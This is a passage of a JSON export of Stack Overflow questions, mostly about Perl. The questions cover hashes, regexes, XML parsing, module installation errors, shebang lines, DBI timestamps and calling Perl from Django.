tests.</p>\n"},{"tags":["javascript","xml","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12947678,"title":"Display XML/JSON content in HTML page","body":"<p>I am newbie , I have application in which check-box tree is present. I want to pre-populate the check-box's if user before checked some of those check box.</p>\n\n<p>For that am getting XML format from my back-end perl script as shown below.like , in below XML only 0, 43,44,45,46 and 50 are coming so only those respective checkbox need to checked on page load.I want to display those checked check-box on page load .How can I do this .......?</p>\n\n<p>I tried with so many examples . but am not getting solution for my problem .Below is my XML format data which is am getting from perl script .</p>\n\n<pre><code>&lt;perldata&gt; \n&lt;hashref memory_address=\"0x86f4880\"&gt; \n&lt;item key=\"0\"&gt;1&lt;/item&gt; \n&lt;/hashref&gt; \n&lt;/perldata&gt; \n&lt;perldata&gt; \n&lt;hashref memory_address=\"0x86f4880\"&gt; \n&lt;item key=\"43\"&gt;1&lt;/item&gt; \n&lt;/hashref&gt;  \n&lt;/perldata&gt; \n&lt;perldata&gt; \n&lt;hashref memory_address=\"0x86f4880\"&gt; \n&lt;item key=\"44\"&gt;1&lt;/item&gt; \n&lt;/hashref&gt; \n&lt;/perldata&gt; \n&lt;perldata&gt; \n&lt;hashref memory_address=\"0x86f4880\"&gt; \n&lt;item key=\"45\"&gt;1&lt;/item&gt; \n&lt;/hashref&gt; \n&lt;/perldata&gt; \n&lt;perldata&gt; \n&lt;hashref memory_address=\"0x86f4880\"&gt; \n&lt;item key=\"46\"&gt;1&lt;/item&gt; \n&lt;/hashref&gt;  \n&lt;/perldata&gt; \n&lt;perldata&gt; \n&lt;hashref memory_address=\"0x86f4880\"&gt; \n&lt;item key=\"50\"&gt;1&lt;/item&gt; \n&lt;/hashref&gt; \n&lt;/perldata&gt;\n</code></pre>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12943706,"title":"How to extract part of a line in a text file and print it to an output file in Perl (Code half-written)","body":"<p>I have a large .txt file, a part of which is shown below -</p>\n\n<pre><code>ID   SNP\nFT   SNP             102\nFT                   /note=\"refAllele: C SNPstrains: 4395_8_10=A 4395_8_7=A 4395_8_9=A     \"\nFT                   /colour=1\nFT   SNP             1299\nFT                   /note=\"refAllele: A SNPstrains: 6437_8_6=T (non-synonymous) (AA Gin-&gt;His) \"\nFT                   /colour=2\nFT   SNP             2134\nFT                   /note=\"refAllele: C SNPstrains: 4395_8_12=T \"\nFT                   /colour=1\nFT   SNP             3205\nFT                   /note=\"refAllele: C SNPstrains: 6437_8_12=T (synonymous) \"\n</code></pre>\n\n<p>I have this script as well (which I did not write) -</p>\n\n<pre><code>$cod{1} = \"Int\";\n$cod{2} = \"non\";\n$cod{3} = \"syn\";\n$cod{4} = \"stop\";\n\n$file = \"Whole.pl\";\nopen IN, \"$file\";\nopen OUT, \"&gt;whole2\";\nprint OUT \"Coordinate   Type    Strains\\n\";\n\nwhile (&lt;IN&gt;) {\n\n    if (m/^FT\\s+SNP\\s+(\\d+)/) {\n\n        $SNP = $1;      \n    }\n    elsif (m/^FT\\s+\\/note=\"(.*)\"/) {\n\n        $line = $1;\n        $count = ($line =~ tr/=/=/);\n    }\n    elsif (m/^FT\\s+\\/colour=(\\d+)/) {\n\n        if ($cod{$1}) {\n\n            print OUT \"$SNP $cod{$1} $count\\n\";\n        }\n        elsif (!$cod{$1}) {\n\n            print OUT \"$SNP colour $1 $count\\n\";\n        }\n    }\n}    \n</code></pre>\n\n<p>It creates a new file. For the above data it would create this -</p>\n\n<pre><code>Coordinate  Type    Strains \n102          Int    3\n1299         non    1\n2134         Int    1\n3205         syn    1\n</code></pre>\n\n<p>I am very new to perl and programming in general, and think I just about understand what this script is doing. However, for strains that show a non-synonymous mutation (such as the second one in the .txt file), I would like to have a fourth column in the output file which details the amino acid change (e.g. (AA Gin->His), end of the sixth line in the .txt file). Also, I would ideally like to just have non-synonymous mutations shown in the output, and leave the \"syn\" and \"int\" out altogether.</p>\n\n<p>I have tried numerous ways to do this but none have worked. Please can you show me a way to do this?</p>\n\n<p>Many thanks in advance.</p>\n\n<p>Max</p>\n"},{"tags":["php","perl","drupal","godaddy","fastcgi"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12946316,"title":"Running PHP from Perl Script","body":"<p>I am attempting to run php scripts from a perl script on my goDaddy shared hosting.  The PHP script I originally wrote exceeds their 120 sec time limit and the mySQL memory limit, so I am breaking the script up into several parts.  I want this to all run as one cron job, so I want to call a single perl script that runs 4-5 php scripts. </p>\n\n<p>This is for my website, run with Drupal 7.</p>\n\n<p>I've written a perl script with the following content:</p>\n\n<pre><code>my $command = '/web/cgi-bin/php5 -q $HOME/html/phpscript1.php';\nexec ($command) or print STDERR \"couldn't exec $command: $!\";\n</code></pre>\n\n<p>Which calls a php scripts containing something like the following:</p>\n\n<pre><code>&lt;?php\n\ndefine('DRUPAL_ROOT', getcwd());\n\ninclude_once DRUPAL_ROOT . '/includes/bootstrap.inc';\ndrupal_bootstrap(DRUPAL_BOOTSTRAP_FULL);\n....\ndo stuff\n....\n?&gt;\n</code></pre>\n\n<p>But when I run this from perl (tried in both my $HOME directory and html directory) I see the following problems when I run the script (where XXXXXX is my godaddy account folder):</p>\n\n<pre><code>&lt;b&gt;Notice&lt;/b&gt;:  Undefined index:  SCRIPT_NAME   \n&lt;b&gt;/home/content/05/XXXXXXX/html/includes/bootstrap.inc&lt;/b&gt; on line &lt;b&gt;1627&lt;/b&gt;&lt;br /&gt;\n&lt;br /&gt;\n&lt;b&gt;Notice&lt;/b&gt;:  Undefined index:  REMOTE_ADDR in    \n&lt;b&gt;/home/content/05/XXXXXXX/html/includes/bootstrap.inc&lt;/b&gt; on line &lt;b&gt;2802&lt;/b&gt;&lt;br /&gt;\n&lt;br /&gt;\n&lt;b&gt;Notice&lt;/b&gt;:  Undefined index:  argc in\n&lt;b&gt;/home/content/05/XXXXXXX/html/includes/bootstrap.inc&lt;/b&gt; on line &lt;b&gt;3290&lt;/b&gt;&lt;br /&gt;\n</code></pre>\n\n<p>I've deduced that these are issues with FastGCI and that I probably need to define/export/point these index/variables to something, but I have been unable to find out what do to after extensive searching.</p>\n\n<p>The PHP script copies images from an external server to my server using CURL</p>\n\n<p>Thanks for your help!</p>\n"},{"tags":["regex","linux","perl","unix","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":98,"score":1,"question_id":10268355,"title":"Shell/AWK - Its not displaying the values, and how to add reg exp","body":"<p>I have a small issue, the code below was working fine but now its not displaying nothing, i dont quite understand where is the error for this.</p>\n\n<pre><code>&gt; #! /bin/bash\n\nawk -F, '       FILENAME = $1 { FS = \":\" }\n\n        { print $1 \" \"  $2 \" \"  $3 \" \" $4 }\n\n\n\n\n\n                '\n</code></pre>\n\n<ul>\n<li>I would like to add some options like: ./search thefile -C </li>\n</ul>\n\n<p>i want that the reg ex -C to be like an option and display some specific things.</p>\n\n<p>Any ideas about this ?</p>\n\n<p>Thankyou</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":58,"score":-1,"question_id":12944116,"title":"how to print 2 hashes intercalating the keys?","body":"<p>Please, I'm initializing 2 hashes by:</p>\n\n<pre><code>$hash1{$key} = -9;\n$hash2{$key} = -9;\n</code></pre>\n\n<p>Then I get the array @order with the order of the keys:</p>\n\n<pre><code>my @order1 = sort {$a cmp $b} keys(%hash1);\nmy @order2 = sort {$a cmp $b} keys(%hash2);\n</code></pre>\n\n<p>Then I want to print these 2 arrays intercalating the keys. Example: 1Âº key of 1Âº hash, 1Âº key of 2Âº hash, and so on. </p>\n\n<pre><code>print(join(\"\\t\", @order1, @order2) . \"\\n\"); #this will print the entire hash1 first and     then the hash 2\n</code></pre>\n\n<p>Please how can I do it?</p>\n"},{"tags":["arrays","perl","push","elements"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":223,"score":2,"question_id":5426512,"title":"Easy way to execute a statement many times in Perl","body":"<p>Is there a shorthand way by which I can push n identical elements to an array ?</p>\n\n<p>Can I do this in just one line ?</p>\n\n<pre><code>push(@mode_z00,\"lib_drx\");\npush(@mode_z00,\"lib_drx\");\npush(@mode_z00,\"lib_drx\");\npush(@mode_z00,\"lib_drx\");\npush(@mode_z00,\"lib_drx\");\n</code></pre>\n\n<p>something like \n    push(@mode_z00,5,\"lib_drx\");</p>\n"},{"tags":["perl","associative-array"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12943043,"title":"Perl Hash Array foreach issue","body":"<p>I have a response which is displayed through Data::Dumper - Dumper($cat_response->result->{'categories'})</p>\n\n<pre><code>$VAR1 = { 'literature' =&gt; '1120', 'law' =&gt; '1153', 'arts and crafts' =&gt; '1132', 'children' =&gt; '1141', 'hobbies' =&gt; '1133', 'economy' =&gt; '1166', 'jobs' =&gt; '1140', 'media' =&gt; '1144', 'music' =&gt; '1147', 'animals' =&gt; '1170', 'business' =&gt; '1119', 'diet' =&gt; '1122', 'travel reviews' =&gt; '1154', 'jewelry' =&gt; '1157', 'movies' =&gt; '1146', 'television' =&gt; '1125', 'politics' =&gt; '1168', 'internet' =&gt; '1139', 'history' =&gt; '1129', 'recipes' =&gt; '1156', 'press releases' =&gt; '1151', 'presents' =&gt; '1128', 'marketing' =&gt; '1143', 'translations' =&gt; '1162', 'fashion' =&gt; '1145', 'technology' =&gt; '1163', 'real estate' =&gt; '1138', 'computer' =&gt; '1173', 'automobile' =&gt; '1116', 'finances' =&gt; '1126', 'weddings' =&gt; '1134', 'games' =&gt; '1127', 'esoterism' =&gt; '1124', 'horoscopes' =&gt; '1135', 'shopping' =&gt; '1123', 'humor' =&gt; '1137', 'miscellaneous' =&gt; '1159', 'science' =&gt; '1167', 'programming' =&gt; '1152', 'languages' =&gt; '1161', 'beauty' =&gt; '1117', 'sports' =&gt; '1160', 'hotels' =&gt; '1136', 'plants' =&gt; '1149', 'education' =&gt; '1118', 'traveling' =&gt; '1155', 'health' =&gt; '1130', 'telecommunication' =&gt; '1164', 'environment' =&gt; '1171', 'software' =&gt; '1158', 'sweepstakes' =&gt; '1131', 'logistics' =&gt; '1142', 'home and family' =&gt; '1169', 'news' =&gt; '1148' };\n</code></pre>\n\n<p>To access it, I use: </p>\n\n<pre><code>my %categories = $cat_response-&gt;result-&gt;{'categories'};\nforeach my $cat (keys (%categories)) {\n    &lt;option value=\"&lt;% $categories{'$cat'} %&gt;\"&gt;&lt;% $cat %&gt;&lt;/option&gt;\n}\n</code></pre>\n\n<p>However, the value of Dumper($cat) is: $VAR1 = 'HASH(0x7fe972641560)';</p>\n\n<p>Did I miss something?</p>\n"},{"tags":["perl","object","reference","deepcopy"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":2,"view_count":56,"score":-1,"question_id":12943684,"title":"array deepcopy instead of reference in perl object","body":"<p>i tried several hours to store a sub array into an object and failed. maybe someone of you can show me how to store a deep copy with perl.\nsry i dont know if this question is clear, but should be easy to solve...</p>\n\n<p>here the example.</p>\n\n<p>here the object class</p>\n\n<pre><code>package obj;\n\nuse strict;\nuse warnings;\nrequire Exporter;\nour @ISA = qw(Exporter);\n\nsub new(\\@){\n    my $class=shift;\n    my $this={};\n    $this-&gt;{\"array\"}=shift;\n    return bless($this,$class);\n}\n\nsub getArray(){\n    my $this=shift;\n    return $this-&gt;{\"array\"};\n}\n</code></pre>\n\n<p>and the test class</p>\n\n<pre><code>use strict;\nuse warnings;\nuse obj;\n\nmy @a=(1,2);\npush @a,3;\nmy $ob=obj-&gt;new(\\@a);\n@a=();\nprint @{$ob-&gt;getArray()};\n</code></pre>\n\n<p>this returns nothing - does not shift dereference the array?</p>\n\n<p>so how to do this?</p>\n\n<p>thx</p>\n"},{"tags":["perl","gmp"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":445,"score":1,"question_id":10447641,"title":"Math::GMP errors when installing","body":"<p>Im trying to install <code>Math::GMP</code> but it keeps failing and im not sure where to go from here .  This is what im typing and here is the output pointing to the log file:</p>\n\n<pre><code>[root@confeng Math-GMP-2.06-VEVNp7]# cpanm Math::GMP\n--&gt; Working on Math::GMP\nFetching http://www.cpan.org/authors/id/T/TU/TURNSTEP/Math-GMP-2.06.tar.gz ... OK\nConfiguring Math-GMP-2.06 ... OK\nBuilding and testing Math-GMP-2.06 ... FAIL\n! Installing Math::GMP failed. See /root/.cpanm/build.log for details.\n[root@confeng Math-GMP-2.06-VEVNp7]#\n</code></pre>\n\n<p>I checked the logs and im not sure what structure im supposed to have\nhere are the logs of <code>/root/.cpanm/build.log</code>  </p>\n\n<pre><code>cpanm (App::cpanminus) 1.5011 on perl 5.008008 built for i386-linux-thread-multi\nWork directory is /root/.cpanm/work/1336128898.6464\nYou have make /usr/bin/make\nYou have /usr/bin/wget\nYou have /bin/tar: tar (GNU tar) 1.15.1\nYou have /usr/bin/unzip\nSearching Math::GMP on cpanmetadb ...\n--&gt; Working on Math::GMP\nFetching http://www.cpan.org/authors/id/T/TU/TURNSTEP/Math-GMP-2.06.tar.gz\n-&gt; OK\nUnpacking Math-GMP-2.06.tar.gz\nEntering Math-GMP-2.06\nChecking configure dependencies from META.yml\nConfiguring Math-GMP-2.06\nRunning Makefile.PL\nChecking if your kit is complete...\nLooks good\nWriting Makefile for Math::GMP\n-&gt; OK\nFinding PREREQ from Makefile ...\nBuilding and testing Math-GMP-2.06\ncp lib/Math/GMP.pm blib/lib/Math/GMP.pm\nAutoSplitting blib/lib/Math/GMP.pm (blib/lib/auto/Math/GMP)\n/usr/bin/perl /usr/lib/perl5/5.8.8/ExtUtils/xsubpp  -      typemap /usr/lib/perl5/5.8.8/ExtUtils/typemap -typemap typemap  GMP.xs &gt; GMP.xsc &amp;&amp; mv GMP.xsc GMP.c\ngcc -c   -D_REENTRANT -D_GNU_SOURCE -fno-strict-aliasing -pipe -Wdeclaration-after-statement -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -I/usr/inc$\nGMP.xs:4:17: error: gmp.h: No such file or directory\nGMP.xs: In function Ã¢constantÃ¢:\nGMP.xs:49: warning: label Ã¢not_thereÃ¢ defined but not used\nGMP.c: In function Ã¢XS_Math__GMP_new_from_scalarÃ¢:\nGMP.c:93: error: Ã¢mpz_tÃ¢ undeclared (first use in this function)\nGMP.c:93: error: (Each undeclared identifier is reported only once\nGMP.c:93: error: for each function it appears in.)\nGMP.c:93: error: Ã¢RETVALÃ¢ undeclared (first use in this function)\nGMP.xs:70: warning: implicit declaration of function Ã¢mpz_init_set_strÃ¢\nGMP.c: In function Ã¢XS_Math__GMP_new_from_scalar_with_baseÃ¢:\nGMP.c:114: error: Ã¢mpz_tÃ¢ undeclared (first use in this function)\nGMP.c:114: error: Ã¢RETVALÃ¢ undeclared (first use in this function)\nGMP.c: In function Ã¢XS_Math__GMP_destroyÃ¢:\nGMP.c:133: error: Ã¢mpz_tÃ¢ undeclared (first use in this function)\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12942895,"title":"Replace the hash by hashreference in Perl?","body":"<p>I have a subroutine, which gets a hashreference as a parameter.<br></p>\n\n<p>I can manipulate single hashvalues by reference.\nI want to replace the whole hash, which the reference point at, so that everywhere, where this hash was references the changes become visible.</p>\n\n<pre><code>sub replace{\n    my $hashref = shift;\n\n    # can manipulate hash here\n    $hashref-&gt;{key} = \"newValue\";\n\n    # how to replace replace the hash here by a new hash\n    $newHashRef = {\n        key  =&gt; \"value\",\n        key2 =&gt; \"value2\",\n    };\n}\n</code></pre>\n\n<p>Is that possible?</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":43,"score":0,"question_id":12942049,"title":"Win32::IEAutomation getLink error","body":"<p>I have a script that looks at a paginated web page and clicks through the links. </p>\n\n<pre><code>  my $self = shift;\n  my $ie = shift;\n\n  my $nextpage = $ie-&gt;getLink('linktext:', 'âºâº');\n\n  if (defined $nextpage) {\n   $nextpage-&gt;Click;\n     return 1;\n  } else {\n    return 0;\n  }\n</code></pre>\n\n<p>My problem is that when it does not see the next link it should just return (this is a sub) false... it does that but still throws an error saying \"Warning: No link is present in the document with your specified option linktext: >>\" This is really a false error since it is supposed to end when no other link is found. How do I stop that error? </p>\n"},{"tags":["perl","unix","solaris","shebang"],"answer_count":4,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":183,"score":3,"question_id":12910744,"title":"Why should the shebang line always be the first line?","body":"<p>I have simple perl script as below:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nprint \"hello ! world\\n\";\n</code></pre>\n\n<p>i can execute this script as below:</p>\n\n<pre><code>&gt;temp.pl\nhello ! world\n&gt;\n</code></pre>\n\n<p>if i add some comments like this:</p>\n\n<pre><code>#this script is just for test\n#the shebang\n#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nprint \"hello ! world\\n\";\n</code></pre>\n\n<p>and when i try to execute,it gives me output as below:</p>\n\n<pre><code>&gt; temp.pl\nuse: Command not found.\nuse: Command not found.\nprint: Command not found.\n&gt; \n</code></pre>\n\n<p>The point here is shebang line should be always at the top no matter what.\nbut can anybody explain me why?</p>\n"},{"tags":["sql","perl","dbi"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":78,"score":-2,"question_id":12940179,"title":"Perl DBI: Return unique time stamp","body":"<p>I need a way to have the database return a unique time stamp (Format YYYYMMDD.HH:MM:SS) or something I can parse. My program has file names that come in and get renamed, I am trying to find a way to make sure I get no duplicate time stamps on a file and risk overwriting a file.  The database will only keep track of time record in YYYYMMDD.HH:MM:SS format.  If a file comes in and has a time that matches the database I need the database to return a new time stamp and update the database.</p>\n\n<pre><code>if( $fileName =~ m/^[a-z0-9]{3}[0-9]{5}\\.[0-9]{5}\\.([0-9]{8}\\.[0-9]{2}:[0-9]{2}:[0-9]{2})\\.(.)*/ )\n{\n    $dttmstmp = $1;\n}\nelse\n{\n    $current_time = Date-&gt;getDateTime();\n    $dttmstmp = $current_time;\n}\n\n    my $databaseHandle = getDbConnection();\n    my $tstamp_present = getDbTime ( $databaseHandle , $dttmstmp );\n\n    if ($tstamp_present == 1)\n    {\n            sleep(1);   # sleep to change timestamp\n            $dttmstmp = Date-&gt;getDateTime(); # Get new timestamp\n            updateTimestamp ( $databaseHandle , $dttmstmp ); # Update database with new timestamp\n    }\n    else\n    {\n            updateTimestamp ( $databaseHandle , $dttmstmp ); # Update database with new timestamp\n    }\n</code></pre>\n"},{"tags":["xml","perl","cpan","nmap"],"answer_count":1,"favorite_count":1,"up_vote_count":17,"down_vote_count":0,"view_count":203,"score":17,"question_id":11609428,"title":"Nmap::Parser, Segmentation fault on large files","body":"<p>I would like to use <code>Nmap::Parser</code> to convert the XML output of an <code>nmap</code> scan into a CSV file and I am already having problems at the very beginning.</p>\n\n<p>Parsing small TCP/UDP scans work fine, but when I try to convert a larger file (e.g., 20 MB) , especially one with all 65535 UDP ports open|filtered, I get a segmentation fault.</p>\n\n<p>The problem seems to be the \"parsefile\" method.</p>\n\n<p>I tried different versions of Perl 5.10/5.14 on Linux and Mac OS X with the same results. Please see code snippet below.</p>\n\n<pre><code>#!/usr/bin/env perl\nuse strict; use warnings;\nuse Nmap::Parser;\n\nmy $np1 = new Nmap::Parser;\nmy $xmlin = $ARGV[0];\n\nsub read_file {\n    $np1-&gt;parsefile($xmlin);\n    for my $host ($np1-&gt;all_hosts()) {\n        for my $port ($host-&gt;udp_ports()) {\n            print $host-&gt;ipv4_addr().\" \".$port.\"\\n\";\n\n        }   \n    }\n}\n\n&amp;read_file;\n</code></pre>\n"},{"tags":["perl","unix"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":12937889,"title":"removing a column from a delimited file","body":"<p>I am trying to cut and paste together a tab-delimited file and have been using the cut and paste utilities from unix in this manner:</p>\n\n<pre><code>cut -f 1-66 file1 &gt; file1a\ncut -f 68- file1  &gt; file1b\npaste file1a file1b\n</code></pre>\n\n<p>However I was wondering if there was a way to do it in Perl/Ruby using the -F command because that probably would be quicker in the long run. For example</p>\n\n<pre><code>perl -F/\\\\t/ -ane\nfor every line in document\n  for i (0..66) and (67..Last field in line)\n    print $[i]\n   end\n   print \\n\nend\n</code></pre>\n"},{"tags":["perl","escaping","malformed"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":2598,"score":0,"question_id":3567327,"title":"How to avoid malformed URI sequence error?","body":"<p>I'm working with perl. I have data saved on database as  <code>Ã Ã¢â¬Å</code></p>\n\n<p>and I want to escape those characters to avoid having malformed URI sequence error on the client side. This error seems to happen on fire fox only. The fix I found while googling is not to use <code>decodeURI</code> , yet I need this for other characters to be displayed correctly.</p>\n\n<p>Any help? <code>uri_escape</code> does not seem enough on the server side.</p>\n\n<p>Thanks in advance.</p>\n\n<hr>\n\n<p>Detalils:\nIn perl I'm doing the following:</p>\n\n<pre><code>print \"&lt;div style='display:none;' id='summary_\".$note_count.\"_note'&gt;\".uri_escape($summary).\"&lt;/div&gt;\"; \n</code></pre>\n\n<p>and on the java script side I want to read from this div and place it on another place as this:</p>\n\n<pre><code>getObj('summary_div').innerHTML= unescape(decodeURI(note_obj.innerHTML));\n</code></pre>\n\n<p>where the note_obj is the hidden div that saved the summary on perl.\nWhen I remove decodeURI the problem is solved, I don't get malformed URI sequence error on java script. Yet I need to use decodeURI for other characters. </p>\n\n<p>This issue seems to be reproduced on firefox and IE7.</p>\n"},{"tags":["multithreading","perl","testing","selenium2","alien"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12937784,"title":"Simple perl multithreading for Alien::SeleniumRC","body":"<p><a href=\"https://metacpan.org/module/Alien%3a%3aSeleniumRC\" rel=\"nofollow\">Alien::SeleniumRC</a> says about its <code>start</code> method that \"This call will block until the server is killed.\"</p>\n\n<p>I'd like to use it to start the Selenium server, run some Selenium tests, then shut down the Selenium server--all from a single <code>perl</code> script.  What's the simplest clean way of achieving this?  (By clean I mean that if something goes wrong, it will shut down the Selenium server on the way out so it doesn't need to be shut down manually.)</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":2,"up_vote_count":4,"down_vote_count":1,"view_count":150,"score":3,"question_id":10505065,"title":"Situations where Perl would not call DESTROY on object destruction?","body":"<p>This is a perplexing problem that a co-worker of mine has. And I have not been able to work out the cause, either.</p>\n\n<p>The short version is, in a class he has written, which has a <code>DESTROY</code> destructor/method defined, <code>DESTROY</code> is not getting called when the object is destroyed. It is not getting called at the point where we would have thought the object goes out of scope. And while we considered that maybe there was a dangling reference to it somewhere, it isn't being called at script exit, either. We've littered the class and the script with debugging <code>print</code> statements, and even made an explicit call to it in an <code>END</code> block just to verify that we hadn't somehow put it in the wrong namespace. (We hadn't. The explicit call triggered all the <code>print</code> statements as expected.)</p>\n\n<p>So I'm puzzled by this, and am just as interested in the answer as he is. What situations might lead to this behavior? The script in question is exiting cleanly - there is no call to <code>POSIX::_exit</code> or anything like that. The only \"variable\" in this is that the class is using <a href=\"https://metacpan.org/module/Class%3a%3aMethodMaker\" rel=\"nofollow\"><code>Class::MethodMaker</code></a> to define some accessors and the constructor. However, there are no references in the <code>Class::MethodMaker</code> docs to having interaction with (or overriding) a class <code>DESTROY</code> method.</p>\n"},{"tags":["perl","loops","undefined","defined"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12938018,"title":"Perl react to undefined in module","body":"<p>I have a written a script that uses different modules.\nThe script a loop, returning to the beginning until it reaches a certain id and the dies.</p>\n\n<p>But sometimes, the result of a module query is undefined and the script stops. In my current case:</p>\n\n<pre><code>Can't use an undefined value as a HASH reference at /modulepath/module.pm line xxx\n</code></pre>\n\n<p>How can I tell Perl, not to stop and skip the current processing?\nI tried to use the follwing without success:</p>\n\n<pre><code>if (defined $var-&gt;movie( id =&gt; $imdb )){ \n#do the usual stuff \n}\nelse {\n#skip and do nothing\n}\n</code></pre>\n"},{"tags":["regex","perl","utf-8"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":94,"score":2,"question_id":12936299,"title":"Case insensitive regex for non-English characters","body":"<p>I need to perform a regular expression match on text that includes non-English characters (Spanish, French, German, and Russian).</p>\n\n<p>I want the match to ignore case, so with English characters I would just use the <code>/i</code> modifier, but that doesn't work with words like <strong>Ã¼bermÃ¤Ãig</strong>. </p>\n\n<p>What is the simplest way to write a regex that will match both, say, Ã¼bermÃ¤Ãig and ÃBERMÃÃig? And can the same approach be used to convert upper case non-English letters to their lowercase equivalents in Perl?</p>\n"},{"tags":["perl","numbers"],"answer_count":9,"favorite_count":4,"up_vote_count":17,"down_vote_count":0,"view_count":24344,"score":17,"question_id":12647,"title":"How do I tell if a variable has a numeric value in Perl?","body":"<p>Is there a simple way in Perl that will allow me to determine if a given variable is numeric?  Something along the lines of:</p>\n\n<pre><code>if (is_number($x))\n{ ... }\n</code></pre>\n\n<p>would be ideal.  A technique that won't throw warnings when the <code>-w</code> switch is being used is certainly preferred.</p>\n"},{"tags":["perl","unix"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":68,"score":-1,"question_id":12935908,"title":"How to override usr bin env perl","body":"<p>This only checks PATH variable?</p>\n\n<p>Can I \"override\" path by using say PERL=/usr/somelocal/perl</p>\n\n<p>Thanks</p>\n"},{"tags":["regex","perl","lookahead","lookbehind","regex-lookarounds"],"answer_count":5,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":538,"score":4,"question_id":7867179,"title":"Nested regex lookahead and lookbehind","body":"<p>I am having problems with the nested '+'/'-' lookahead/lookbehind in regex.</p>\n\n<p>Let's say that I want to change the <code>'*'</code> in a string with <code>'%'</code> and let's say that <code>'\\'</code> escapes the next character. (Turning a regex to sql like command ^^). </p>\n\n<p>So the string </p>\n\n<ul>\n<li><code>'*test*'</code> should be changed to <code>'%test%'</code>, </li>\n<li><code>'\\\\*test\\\\*'</code> -> <code>'\\\\%test\\\\%'</code>, but </li>\n<li><code>'\\*test\\*'</code> and <code>'\\\\\\*test\\\\\\*'</code> should stay the same.</li>\n</ul>\n\n<p>I tried:</p>\n\n<pre><code>(?&lt;!\\\\)(?=\\\\\\\\)*\\*      but this doesn't work\n(?&lt;!\\\\)((?=\\\\\\\\)*\\*)    ...\n(?&lt;!\\\\(?=\\\\\\\\)*)\\*      ...\n(?=(?&lt;!\\\\)(?=\\\\\\\\)*)\\*  ...\n</code></pre>\n\n<p>What is the correct regex that will match the '*'s in examples given above?</p>\n\n<p>What is the difference between <code>(?&lt;!\\\\(?=\\\\\\\\)*)\\*</code> and <code>(?=(?&lt;!\\\\)(?=\\\\\\\\)*)\\*</code> or if these are essentially wrong the difference between regex that have such a visual construction?</p>\n"},{"tags":["django","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12928361,"title":"Trying to pass key value pair to perl script via subprocess module","body":"<p>I am trying to send key:value pair to perl script via sub-process module . I just tried with simple example it works fine. How can I pass key:value pair to perl script .....?</p>\n\n<p>Ans also how can send multiple input fields value to perls script> Below is my code</p>\n\n<p>view.py</p>\n\n<pre><code>from django.http import HttpResponseRedirect, HttpResponse\nfrom django.shortcuts import get_object_or_404, render_to_response\nfrom django.template import RequestContext\nfrom subprocess import Popen, PIPE, sys\nimport subprocess \n\ndef ex(request):\n   myName = 'Pervez'\n   if 'firstname' in request.POST:\n     myName = (request.POST['firstname'])\n   p = Popen(['/home/pervez/Desktop/simplepage/simplepage/templates/ex.pl', myName],stdin=PIPE, stdout=PIPE)\n    p.stdin.close()\n    result = p.stdout.read()\nreturn render_to_response('ex.html', {'name': result},context_instance=RequestContext(request))\n</code></pre>\n\n<p>ex.html</p>\n\n<pre><code>{{ name }}\n&lt;FORM METHOD=\"POST\" ACTION=\"\" NAME=\"SIGNUPFORM\"&gt;\n{% csrf_token %}\n&lt;fieldset&gt;\n&lt;legend&gt;Signup Form&lt;/legend&gt;\n&lt;table&gt;\n&lt;tr&gt;&lt;td&gt;First Name&lt;/td&gt;&lt;td&gt;&lt;INPUT SIZE=20 NAME=\"firstname\"&gt; &lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td&gt;Last Name&lt;/td&gt;&lt;td&gt;&lt;INPUT SIZE=20 NAME=\"lastname\"&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td&gt;User Name&lt;/td&gt;&lt;td&gt;&lt;INPUT SIZE=20 NAME=\"username\"&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;INPUT SIZE=20 NAME=\"password\"&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td&gt;Verify Password&lt;/td&gt;&lt;td&gt;&lt;INPUT SIZE=20 NAME=\"vpass\"&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td&gt;Your E-mail&lt;/td&gt;&lt;td&gt;&lt;INPUT SIZE=20 NAME=\"email_id\"&gt;&lt;/td&gt;&lt;/tr&gt;\n&lt;tr&gt;&lt;td 